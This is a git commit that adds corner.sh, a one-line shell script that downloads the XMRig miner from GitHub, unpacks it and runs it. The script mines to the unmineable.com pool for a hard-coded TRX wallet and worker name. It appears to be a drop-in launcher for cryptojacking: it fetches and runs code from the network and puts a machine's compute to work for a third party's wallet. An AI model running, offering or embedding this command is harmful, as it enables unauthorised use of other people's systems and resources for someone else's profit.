6d034f5ffc1efc96b8d2f88ae800fe9615cb090c
cornjun <110182617+cornjun@users.noreply.github.com>
2022-07-28 14:32:43 +0000

    Create corner.sh

---
+++ corner.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TALFCwj7GajwwmctVsLXdeeDAJKa67sj4d.Cornertech -p x
